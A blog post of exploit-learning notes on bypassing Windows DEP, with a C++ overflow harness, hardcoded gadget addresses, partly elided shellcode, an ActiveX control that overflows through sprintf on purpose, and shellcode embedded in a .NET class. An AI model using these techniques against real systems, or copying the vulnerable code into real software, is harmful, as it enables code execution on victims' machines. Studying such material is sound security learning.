---
title: Exploit learning notes 016 executable memory and .net attack DEP
description: Ret2Libc's DEP attack using VirtualProtect and VirtualAlloc
date: 2020-11-20 14:13:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

Source: [Moeomu's Blog](/posts/exploit-learning-notes-016-executable-memory-and-.net-attack-dep/)

## Exploit executable memory to attack DEP

### Principle

- Sometimes there is a readable, writable and executable section of memory in the process memory space, if we can copy the shellcode into this memory and hijack the program flow, our shellcode will have the chance to execute

### Code

```cpp
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"......"
"\x90\x90\x90\x90"
"\x8A\x17\x84\x7C"//pop eax retn
"\x0B\x1A\xBF\x7C"//pop pop retn
"\xBA\xD9\xBB\x7C"//修正EBP retn 4
"\x5F\x78\xA6\x7C"//pop retn
"\x08\x00\x14\x00"//可执行内存中弹出对话框机器码的起始地址
"\x00\x00\x14\x00"//可执行内存空间地址，复制用
"\xBF\x7D\xC9\x77"//push esp jmp eax && 原始 shellcode 起始地址
"\xFF\x00\x00\x00"//shellcode 长度
"\xAC\xAF\x94\x7C"//memcpy
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"......"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
;

void test()
{
    char tt[176];
    memcpy(tt, shellcode, 450);
}

int main()
{
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
    test();

    return 0;
}
```

### Postscript

- It is reasonable to have RWE access to the memory area, but unfortunately, this experiment was not completed

## NET attack on DEP

### Principle

- NET files have the same structure as PE files, i.e. they also have .text and other segments, which are also mapped to memory and have certain executable properties. NET with executable attributes, and then let the program execute in this area to execute the shellcode.
- Requirements
  - ActiveX control with overflow vulnerability
  - NET control with shellcode
  - POC page that can trigger an overflow vulnerability in the ActiveX control

### Code

> ActiveX control with overflow vulnerability

```cpp
void CVulnerAXCtrl::test(LPCTSTR str)
{
    // AFX_MANAGE_STATE(AfxGetStaticModuleState());
    // TODO: Add your dispatch handler code here
    printf("aaaa"); // 定位该函数的标记
    char dest[100];
    sprintf(dest, "%s", str);
}
```
> .NET control with shellcode

```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace DEP_NETDLL
{
    public class Class1
    {
        public void Shellcode()
        {
            string shellcode =
            "\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
            "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
            "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
            "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
            "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
            "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
            "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
            "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
            "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
            "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
            "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
            "\uff53\ufc57\uff53\uf857"
            ;
        }
    }
}
```

## Challenging DEP with Java Applet

> Difficult to find a suitable version, so this experiment is skipped and will be added later when I have a chance
